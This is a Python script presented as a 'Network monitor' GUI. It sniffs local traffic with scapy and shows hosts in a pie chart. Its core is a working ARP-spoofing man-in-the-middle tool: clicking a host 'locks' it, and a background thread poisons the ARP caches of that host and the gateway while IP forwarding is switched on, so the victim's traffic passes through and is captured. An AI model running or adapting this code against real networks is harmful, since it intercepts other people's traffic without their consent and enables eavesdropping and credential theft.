from tkinter import messagebox
from random import randint

import scapy.all as scapy
import tkinter as tk
import ipaddress
import threading
import netifaces
import time
import sys
import os

SNIFF_COUNT     = 10
LOCK_COOLDOWN   = 3
MITM_COOLDOWN   = 2
VERBOSE         = False

IP      = None
GATEWAY = None
SUBNET  = None

LOCKS   = []

STOP_RUNNING = threading.Event()

class PieChartApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Network monitor")
        self.canvas = tk.Canvas(root, width=400, height=400)
        self.canvas.pack()

        self.data = {}

        self.draw_pie_chart()
        self.canvas.bind("<Button-1>", self.on_click)

    def draw_pie_chart(self):
        self.canvas.delete("all")
        total = sum(v["packets"] for v in self.data.values())
        start_angle = 0

        if not total:
            return
        for k, v in self.data.items():
            extent = (v["packets"] / total) * 360
            item_id = self.canvas.create_arc(
                50, 50, 350, 350,
                start=start_angle,
                extent=extent,
                fill=v["color"],
                tags=k
            )
            start_angle += extent
            self.canvas.tag_bind(item_id, "<Enter>", lambda event, label=k: self.show_label(event, label))
            self.canvas.tag_bind(item_id, "<Leave>", lambda event, label=k: self.hide_label(event, label))

    def show_label(self, _, label):
        x, y = self.canvas.coords("current")[0:2]
        self.label_text = self.canvas.create_text(x, y, text=label, anchor="s", font=("Helvetica", 12, "bold"))

    def hide_label(self, _, __):
        self.canvas.delete(self.label_text)

    def generate_color(self):
        is_valid = False
        while not is_valid:
            r = randint(0, 255)
            g = randint(0, 255)
            b = randint(0, 255)

            med = (r + g + b) / 3

            if not any([x > 70 for x in (r, g, b)]):
                continue

            gap = sum([abs(med - x) for x in (r, g, b)])

            if (gap / 3) <= 80:
                continue
            is_valid = True
        r = hex(r)[2:]
        if len(r) == 1:
            r = '0' + r
        g = hex(g)[2:]
        if len(g) == 1:
            g = '0' + g
        b = hex(b)[2:]
        if len(b) == 1:
            b = '0' + b

        return f"#{r}{g}{b}"

    def up_ip(self, ip: str):
        if ip == IP:
            return
        if not ip in self.data.keys():
            self.data[ip] = {
                "packets": 1,
                "locked": False,
                "color": self.generate_color()
            }
        else:
            self.data[ip]["packets"] += 1

    def on_click(self, _):
        item_id = self.canvas.find_withtag("current")
        if item_id:
            tags = self.canvas.gettags(item_id)
            if tags:
                ip = tags[0]
                self.update_slice(ip)

    def update_slice(self, ip):
        lock = messagebox.askyesno(title=f"Lock target {ip}", message=f"Lock {ip} ?")
        if lock and not ip in LOCKS:
            print(f"Locking {ip}")
            LOCKS.append(ip)
        elif ip in LOCKS:
            ip_mac = get_mac_address(ip)
            gateway_mac = get_mac_address(GATEWAY)
            scapy.send(scapy.ARP(op=2, psrc=GATEWAY, pdst=ip, hwsrc=gateway_mac, hwdst=ip_mac), verbose=False)
            scapy.send(scapy.ARP(op=2, psrc=ip, pdst=GATEWAY, hwsrc=ip_mac, hwdst=gateway_mac), verbose=False)
            LOCKS.remove(ip)
            print(f"Stoped lock on {ip}")

def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp = broadcast/arp_request

    answered_list = scapy.srp(arp, timeout=1, verbose=False)[0]

    for _, received in answered_list:
        return received.hwsrc

    return None

def is_in_network(ip):
    my_network = ipaddress.IPv4Network(f"{IP}/{SUBNET}", strict=False)
    ip = ipaddress.IPv4Address(ip)
    return ip in my_network

def handle_packet(app: PieChartApp, pkt):
    if not scapy.IP in pkt:
        return
    if VERBOSE:
        pkt.show()
    src = pkt[scapy.IP].src
    dst = pkt[scapy.IP].dst

    if is_in_network(src):
        app.up_ip(src)
    if is_in_network(dst):
        app.up_ip(dst)
    return

def mitm():
    while not STOP_RUNNING.is_set():
        for ip in LOCKS[:]:
            scapy.send(scapy.ARP(op=2, pdst=ip, psrc=GATEWAY, hwsrc=get_mac_address(GATEWAY)), verbose=False)
            scapy.send(scapy.ARP(op=2, pdst=GATEWAY, psrc=ip, hwsrc=get_mac_address(ip)), verbose=False)
        time.sleep(MITM_COOLDOWN)

def sniff(app: PieChartApp):
    while not STOP_RUNNING.is_set():
        scapy.sniff(prn=lambda x: handle_packet(app, x), store=False, count=SNIFF_COUNT)
        app.draw_pie_chart()

if __name__ == "__main__":
    command = "echo 1 > /proc/sys/net/ipv4/ip_forward"
    if os.name == "nt":
        command = "sysctl -w net.inet.ip.forwarding=1"
    if os.system(command) != 0:
        print("Could not enable port forwarding !")
        print("Please retry while root (or fix the error if you were already)")
        sys.exit(1)
    gws = netifaces.gateways()
    default_interface = gws['default'][netifaces.AF_INET][1]

    iface_data = netifaces.ifaddresses(default_interface)[netifaces.AF_INET][0]
    IP      = iface_data['addr']
    GATEWAY = gws['default'][netifaces.AF_INET][0]
    SUBNET  = iface_data['netmask']
    threading.Thread(target=mitm, daemon=True).start()

    root = tk.Tk()
    app = PieChartApp(root)
    threading.Thread(target=sniff, args=(app,), daemon=True).start()
    try:
        root.mainloop()
    except KeyboardInterrupt:
        print("\rClosing...")
    command = "echo 0 > /proc/sys/net/ipv4/ip_forward"
    if os.name == "nt":
        command = "sysctl -w net.inet.ip.forwarding=0"
    os.system(command)
    STOP_RUNNING.set()
